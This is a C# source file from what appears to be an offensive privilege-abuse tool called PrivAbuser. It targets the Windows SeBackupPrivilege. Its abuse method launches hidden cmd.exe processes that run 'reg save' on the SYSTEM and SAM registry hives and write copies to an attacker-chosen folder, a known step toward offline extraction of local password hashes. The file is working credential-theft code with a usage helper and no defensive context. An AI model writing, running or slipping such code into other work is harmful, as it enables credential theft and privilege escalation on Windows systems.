using System;
using System.Diagnostics;

namespace PrivAbuser.Abuser
{
    public class SeBackupPrivilege
    {
        public static void helper()
        {
            Console.WriteLine("Usage: <exe> /abuseBackupPrivilege /outPath=<path to dir for output\n" +
                "Example: <exe> /abuseBackupPrivilege /outPath=c:\\users\\public");
        }
        public static void abuse(string outPath)
        {
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            Console.WriteLine(String.Format("[+] System hive has been copied to {0}\\system.sav", outPath));
            ps.Arguments = String.Format("/c reg save HKLM\\SYSTEM {0}\\system.sav", outPath);
            Process.Start(ps);
            Console.WriteLine(String.Format("[+] Sam hive has been copied to {0}\\sam.sav", outPath));
            ps.Arguments = String.Format("/c reg save HKLM\\SAM {0}\\sam.sav", outPath);
            Process.Start(ps);
        }
    }
}
